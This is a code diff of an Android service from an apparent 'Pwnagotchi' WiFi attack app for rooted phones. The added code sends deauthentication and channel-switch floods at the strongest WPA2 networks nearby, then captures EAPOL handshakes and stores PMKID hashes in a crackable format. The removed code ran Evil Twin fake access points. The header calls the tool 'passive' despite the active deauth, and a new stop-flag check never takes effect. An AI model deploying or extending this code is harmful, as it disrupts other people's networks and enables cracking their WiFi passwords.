@@ -14,6 +14,12 @@ import android.os.Looper;
 import java.io.*;
 import java.util.*;
 
+/**
+ * Pwnagotchi Zero — passive WiFi sniffer for rooted Android.
+ * v2.0: Monitor-mode-native architecture. No Evil Twin, no WiFi toggling.
+ * 
+ * Pipeline: monitor mode → beacon_flood (CSA deauth) → passive EAPOL capture
+ */
 public class PwngService extends Service {
 
     private static final String CHANNEL_ID = "pwnagotchi_channel";
@@ -35,7 +41,7 @@ public class PwngService extends Service {
     private int totalPmkids = 0, totalHandshakes = 0;
     private Set<String> recentTargets = new HashSet<>();
     private int cycleCount = 0;
-    private static final int TARGET_COOLDOWN = 50; // cycles before clearing blacklist
+    private static final int TARGET_COOLDOWN = 50;
     private long sessionStart;
     private volatile boolean isRunning = false;
     private String lootDir, ourMac = "000000000000";
@@ -58,7 +64,9 @@ public class PwngService extends Service {
     public void onCreate() {
         super.onCreate();
         
-        // Respect manual stop — don't resurrect if user killed us
+        // Clear stop flag on fresh start — we're obviously restarting
+        new File(STOP_FILE).delete();
+        
         if (new File(STOP_FILE).exists()) {
             stopSelf();
             return;
@@ -67,7 +75,7 @@ public class PwngService extends Service {
         sessionStart = System.currentTimeMillis();
         
         File extDir = getExternalFilesDir(null);
-        lootDir = "/data/local/tmp/handshakes";  // magisk context can't write to sdcard
+        lootDir = "/data/local/tmp/handshakes";
         new File(lootDir).mkdirs();
         
         String macRaw = execSu("ip link show wlan0 2>/dev/null | grep -oP 'link/ether \\K[0-9a-f:]+' | head -1");
@@ -96,14 +104,11 @@ public class PwngService extends Service {
         loadKnownPmkids();
         createNotificationChannel();
         
-        // Immediate UI update
         updateNotification();
         
         handler = new Handler(Looper.getMainLooper());
-        // Start background scan loop AFTER monitor init
         isRunning = true;
         new Thread(() -> {
-            // Wait for monitor init to complete
             while (!monitorReady && isRunning) {
                 sleep(500);
             }
@@ -118,18 +123,14 @@ public class PwngService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null && "STOP".equals(intent.getAction())) {
             isRunning = false;
-            // Write stop flag so START_STICKY can't resurrect us
             try { new FileWriter(new File(STOP_FILE)).close(); } catch (Exception e) {}
             stopForeground(true); stopSelf();
-            // Force-kill the process after 2s if thread didn't exit
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 android.os.Process.killProcess(android.os.Process.myPid());
             }, 2000);
             return START_NOT_STICKY;
         }
-        // Clear stop flag on normal start
         new File(STOP_FILE).delete();
-        // Immediately start foreground with placeholder (Android kills services that don't)
         try {
             startForeground(NOTIFY_ID, buildNotification());
         } catch (Exception e) {
@@ -142,14 +143,11 @@ public class PwngService extends Service {
 
     @Override
     public void onDestroy() {
-        // Write stop flag as safety net
         try { new java.io.FileWriter(new java.io.File(STOP_FILE)).close(); } catch (Exception e) {}
-        // Disable monitor mode if active
         if (monitor != null) {
             monitor.disable();
-            return;  // monitor.disable() handles WiFi recovery
+            return;
         }
-        // Emergency WiFi recovery (fallback mode only)
         execSu("cmd wifi stop-softap");
         execSu("cmd wifi set-wifi-enabled enabled");
         super.onDestroy();
@@ -191,7 +189,7 @@ public class PwngService extends Service {
                 if (m4.find()) signal = m4.group(1);
                 
                 apTot++;
-                if (line.contains("PRIVACY")) { wpa2Tot++; flags = "[WPA2]"; }
+                if (line.contains("PRIVACY")) { wpa2Tot++; flags = "[WPA2-PSK]"; }
                 else flags = "[OPEN]";
                 
                 apList.add(new String[]{bssid, ssid, freq, signal, flags});
@@ -213,6 +211,7 @@ public class PwngService extends Service {
         }
         
         apCount = apTot; wpa2Count = wpa2Tot;
+        android.util.Log.i("PwngService", "scan: monitorReady=" + monitorReady + " enabled=" + (monitor != null && monitor.isEnabled()) + " apTot=" + apTot + " wpa2=" + wpa2Tot);
 
         PwngBrain.Decision d = brain.think(apTot, wpa2Tot, scanData);
         
@@ -223,212 +222,84 @@ public class PwngService extends Service {
         totalHandshakes = brain.getTotalHandshakes();
 
         boolean success = false;
+        cycleCount++;
+        if (cycleCount % TARGET_COOLDOWN == 0) recentTargets.clear();
         
-        // Deauth + capture on the strongest WPA2 AP found (rotate targets)
-        if (monitorReady && monitor != null && monitor.isEnabled() && scanData.size() > 0) {
-            cycleCount++;
-            // Clear cooldown every N cycles
-            if (cycleCount % TARGET_COOLDOWN == 0) recentTargets.clear();
-            
-            // Find strongest WPA2 AP not recently attacked
-            String bestBssid = null, bestSsid = "?"; 
-            int bestChan = 6, bestSig = -999;
-            for (String[] ap : scanData) {
-                if (!ap[4].contains("WPA")) continue;
-                if (recentTargets.contains(ap[0])) continue;
-                int sig = 0;
-                try { sig = Integer.parseInt(ap[3]); } catch (Exception e) {}
-                if (sig > bestSig) { bestSig = sig; bestBssid = ap[0]; bestSsid = ap[1]; 
-                    try { bestChan = Integer.parseInt(ap[2]); } catch (Exception e) { bestChan = 6; }
-                }
-            }
-            
-            if (bestBssid != null) {
-                recentTargets.add(bestBssid);
-                monitor.deauth(bestBssid, "ff:ff:ff:ff:ff:ff", bestChan);
-                brain.currentStatus = "👊 deauth " + bestSsid + " (rssi:" + bestSig + ")";
-                updateNotification();
-                try { Thread.sleep(2000); } catch (Exception e) {}
-                String hs = monitor.captureHandshake(lootDir, bestBssid, 15);
-                if (hs != null) { totalHandshakes++; success = true; brain.currentStatus = "💀 handshake! " + bestSsid; }
-            }
-        }
-        
-        if (!success) {
-            switch (d.action) {
-                case "aggressive":  success = doAggressiveHunt(d.targetBssid, d.targetSsid); break;
-                case "evil_twin":   success = doEvilTwin(d.targetBssid, d.targetSsid, d.targetFreq, false); break;
-                case "deauth_twin": success = doEvilTwin(d.targetBssid, d.targetSsid, d.targetFreq, true); break;
-            }
+        // ── Sniff-based attack: beacon_flood deauth → passive EAPOL capture ──
+        if ("sniff_deauth".equals(d.action) && d.targetBssid != null 
+            && monitorReady && monitor != null && monitor.isEnabled()) {
+            success = doSniffDeauth(d);
         }
         
         brain.reportResult(d.action, success, d.targetBssid, success ? "ok" : "fail");
-        android.util.Log.i("PwngService", "cycle done action=" + d.action + " success=" + success + " phase=" + brain.getPhase());
+        android.util.Log.i("PwngService", "cycle=" + cycleCount + " action=" + d.action 
+            + " success=" + success + " phase=" + brain.getPhase() 
+            + " hs=" + totalHandshakes);
         updateNotification();
     }
 
-    // ─── Actions ───────────────────────────────────────────
+    // ─── SNIFF DEAUTH: Passive handshake capture (no Evil Twin, no WiFi toggle) ──
 
-    private boolean doAggressiveHunt(String bssid, String ssid) {
-        brain.currentStatus = "☠ hunting " + ssid;
+    private boolean doSniffDeauth(PwngBrain.Decision d) {
+        String bssid = d.targetBssid;
+        String ssid = d.targetSsid;
+        int channel = 6; // default
+        try { 
+            int freq = Integer.parseInt(d.targetFreq + "");
+            if (freq > 5000) {
+                // 5 GHz: channel = (freq - 5000) / 5 + some offset, just use common values
+                channel = 36; // default 5GHz
+            } else if (freq >= 2412) {
+                // 2.4 GHz: channel = (freq - 2407) / 5
+                channel = (freq - 2407) / 5;
+                if (channel < 1) channel = 1;
+                if (channel > 14) channel = 14;
+            }
+        } catch (Exception e) { channel = 6; }
+        
+        android.util.Log.i("PwngService", "sniff_deauth: " + ssid + " ch=" + channel 
+            + " freq=" + d.targetFreq);
+        
+        // Set monitor to target channel BEFORE deauth
+        monitor.setChannel(channel);
+        
+        // Phase 1: CSA deauth burst (10s, ~16 calls, ~320 frames total)
+        brain.currentStatus = "👊 CSA flood " + ssid + " ch" + channel;
+        currentPhase = "DEAUTH";
         updateNotification();
         
-        String netId = execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " add_network").trim();
-        if (netId.isEmpty() || netId.contains("FAIL")) return false;
+        monitor.deauthBurst(bssid, channel, 10);
         
-        StringBuilder hx = new StringBuilder();
-        try { for (byte b : ssid.getBytes("UTF-8")) hx.append(String.format("%02x", b&0xFF)); }
-        catch (Exception e) { return false; }
+        if (!isRunning) return false;
         
-        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " set_network " + netId + " ssid " + hx);
-        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " set_network " + netId + " key_mgmt WPA-PSK");
-        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " set_network " + netId +
-            " psk 000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f");
-        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " enable_network " + netId);
-        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " select_network " + netId);
-        sleep(2500);
+        // Phase 2: Wait for client to reconnect (5s)
+        brain.currentStatus = "⏳ waiting reconnect " + ssid;
+        currentPhase = "WAIT";
+        updateNotification();
+        sleep(5000);
         
-        String info = execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " bss " + bssid);
-        List<String> pmkids = extractPmkids(info);
+        if (!isRunning) return false;
         
-        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " remove_network " + netId);
-        execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " reassociate");
+        // Phase 3: Passive EAPOL capture (30s, ether proto 0x888e only)
+        brain.currentStatus = "👂 sniffing EAPOL " + ssid;
+        currentPhase = "SNIFF";
+        updateNotification();
         
-        boolean found = false;
-        for (String pk : pmkids) {
-            if (!knownPmkids.contains(pk)) {
-                knownPmkids.add(pk); savePmkid(bssid, ssid, pk); found = true;
-            }
-        }
-        return found;
-    }
-
-    private boolean doEvilTwin(String bssid, String ssid, int freq, boolean deauth) {
-        // ── Multi-pass Evil Twin: maximum aggression ──
-        // Phone AP signal is weak, so we hammer deauth and minimize switch downtime
-        final int PASSES = deauth ? 3 : 1;
-        final int DEAUTH_SEC = 10;           // deauth per pass (shorter but denser)
-        final int AP_WINDOW_SEC = 50;        // Evil Twin window (longer for slow clients)
+        String hs = monitor.captureHandshake(lootDir, bssid, 30);
         
-        // Deauth reason codes to rotate — confuses client WiFi stack
-        final int[] REASONS = {1, 2, 3, 4, 6, 7};  // unspecified, prev-auth-invalid, sta-leaving, inactivity, class2, class3
-        
-        boolean caught = false;
-        int pass;
-        
-        for (pass = 1; pass <= PASSES && !caught && isRunning; pass++) {
-            try {
-                // ── Phase 1: CSA deauth flood with rotating reason codes ──
-                if (deauth) {
-                    int reason = REASONS[(pass - 1) % REASONS.length];
-                    brain.currentStatus = "👊 CSA deauth " + ssid + " (pass " + pass + "/" + PASSES + " r" + reason + ")";
-                    updateNotification();
-                    long deauthEnd = System.currentTimeMillis() + DEAUTH_SEC * 1000L;
-                    while (System.currentTimeMillis() < deauthEnd && isRunning) {
-                        // beacon_flood: sends 10x (deauth + CSA beacon forcing client to our channel)
-                        execSu("/data/data/com.pwnagotchi.app/beacon_flood " + IFACE + " " + bssid
-                               + " \"" + ssid.replace("\"","\\\"") + "\" " + freq + " " + freq + " " + reason);
-                        sleep(600);  // each call takes ~500ms internally
-                    }
-                }
-                
-                // ── Phase 2: Fast switch to AP mode (minimize downtime) ──
-                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
-                    + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
-                    + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " disable_network \\$nid 2>/dev/null; done");
-                
-                brain.currentStatus = "🎭 Evil Twin: " + ssid + " (ch " + freq + " pass " + pass + "/" + PASSES + ")";
-                updateNotification();
-                
-                execSu("cmd wifi set-wifi-enabled disabled"); sleep(800);   // was 1500ms
-                execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" wpa2 twinpass12345 -f " + freq);
-                sleep(1500);  // was 2000ms — AP starts faster now
-                
-                // ── Phase 3: Wait for handshake (longer window) ──
-                long start = System.currentTimeMillis();
-                while (System.currentTimeMillis() - start < AP_WINDOW_SEC * 1000L && !caught && isRunning) {
-                    String clients = execSu("hostapd_cli -p /data/vendor/wifi/hostapd/sockets -i " + IFACE
-                        + " list_sta 2>/dev/null | grep -c '^..:..:..:..:..:..' 2>/dev/null").trim();
-                    if (!clients.isEmpty() && !clients.equals("0")) {
-                        caught = true;
-                        try {
-                            FileWriter fw = new FileWriter(new File(lootDir, "evil_twin_handshakes.txt"), true);
-                            fw.write("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new Date())
-                                + "] " + ssid + " (" + bssid + ") HANDSHAKE (pass " + pass + ")\n");
-                            fw.close();
-                        } catch (Exception e) {}
-                        break;
-                    }
-                    String log = execSu("logcat -d -s hostapd:* 2>&1 | grep -E 'EAPOL|AP-STA-CONNECTED' | tail -3");
-                    if (log.contains("AP-STA-CONNECTED") || log.contains("EAPOL")) {
-                        caught = true;
-                        try {
-                            FileWriter fw = new FileWriter(new File(lootDir, "evil_twin_handshakes.txt"), true);
-                            fw.write("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new Date())
-                                + "] " + ssid + " (" + bssid + ") HANDSHAKE EAPOL\n");
-                            fw.close();
-                        } catch (Exception e) {}
-                        break;
-                    }
-                    sleep(3000);
-                }
-                
-            } finally {
-                execSu("cmd wifi stop-softap");
-                sleep(600);
-                execSu("cmd wifi set-wifi-enabled enabled");
-                sleep(1200);
-                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
-                    + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
-                    + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " enable_network \\$nid 2>/dev/null; done");
-                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " reassociate");
-            }
-        }
-        
-        // ── Fallback: Open network Evil Twin (some clients auto-connect to open known SSIDs) ──
-        if (!caught && deauth && isRunning) {
-            try {
-                brain.currentStatus = "🎭 OPEN Evil Twin: " + ssid + " (fallback)";
-                updateNotification();
-                
-                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
-                    + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
-                    + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " disable_network \\$nid 2>/dev/null; done");
-                execSu("cmd wifi set-wifi-enabled disabled"); sleep(800);
-                execSu("cmd wifi start-softap \"" + ssid.replace("\"","\\\"") + "\" open");
-                sleep(1500);
-                
-                long start = System.currentTimeMillis();
-                while (System.currentTimeMillis() - start < 60000L && !caught && isRunning) {
-                    String clients = execSu("hostapd_cli -p /data/vendor/wifi/hostapd/sockets -i " + IFACE
-                        + " list_sta 2>/dev/null | grep -c '^..:..:..:..:..:..' 2>/dev/null").trim();
-                    if (!clients.isEmpty() && !clients.equals("0")) {
-                        caught = true;
-                        brain.currentStatus = "🎭 OPEN client on " + ssid;
-                        break;
-                    }
-                    sleep(4000);
-                }
-            } finally {
-                execSu("cmd wifi stop-softap");
-                sleep(600);
-                execSu("cmd wifi set-wifi-enabled enabled");
-                sleep(1200);
-                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
-                    + "nid=\\$(echo \"\\$line\" | awk '{print \\$1}'); "
-                    + "wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " enable_network \\$nid 2>/dev/null; done");
-                execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " reassociate");
-            }
-        }
-        
-        if (caught) {
+        if (hs != null) {
+            totalHandshakes++;
             brain.currentFace = FACES.get("FRIEND");
-            brain.currentStatus = "🎭 CAUGHT: " + ssid + " (pass " + pass + ")";
-        } else {
-            brain.currentStatus = "🎭 no client for " + ssid;
+            brain.currentStatus = "💀 handshake! " + ssid;
+            currentPhase = "CAUGHT";
+            android.util.Log.i("PwngService", "HANDSHAKE CAPTURED: " + ssid + " → " + hs);
+            updateNotification();
+            return true;
         }
-        updateNotification();
-        return caught;
+        
+        brain.currentStatus = "😴 no handshake " + ssid;
+        currentPhase = "MISS";
+        return false;
     }
 
     // ─── PMKID ─────────────────────────────────────────────
@@ -475,7 +346,7 @@ public class PwngService extends Service {
         try {
             new File(lootDir).mkdirs();
             FileWriter fw = new FileWriter(new File(lootDir, "pmkid_hashes.22000"), true);
-            fw.write("WPA*02*" + pmkid + "*" + bssid.replace(":","").toUpperCase()
+            fw.write("WPA*02*" + pmkid + "*" + bssid.replace(":", "").toUpperCase()
                      + "*" + ourMac + "*" + ssid + "***\n");
             fw.close();
             FileWriter kw = new FileWriter(new File(lootDir, ".known_pmkids"), true);
@@ -486,9 +357,6 @@ public class PwngService extends Service {
     // ─── MAC Randomization (Opsec) ─────────────────────────
 
     private void randomizeMac() {
-        // Android 10+ auto-randomizes MAC per-SSID via WiFi privacy.
-        // Force a WiFi reset cycle to ensure fresh randomized MAC each session.
-        // Locally-administered MACs (byte0 bit1=1) won't be trackable.
         execSu("cmd wifi set-wifi-enabled disabled 2>/dev/null");
         sleep(800);
         execSu("cmd wifi set-wifi-enabled enabled 2>/dev/null");
@@ -578,7 +446,6 @@ public class PwngService extends Service {
             BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
             BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
             StringBuilder sb = new StringBuilder(); String l;
-            // Watchdog: force-kill after 8 seconds if process hangs
             final Process fp = p;
             Thread watchdog = new Thread(() -> { 
                 try { Thread.sleep(8000); fp.destroyForcibly(); } 
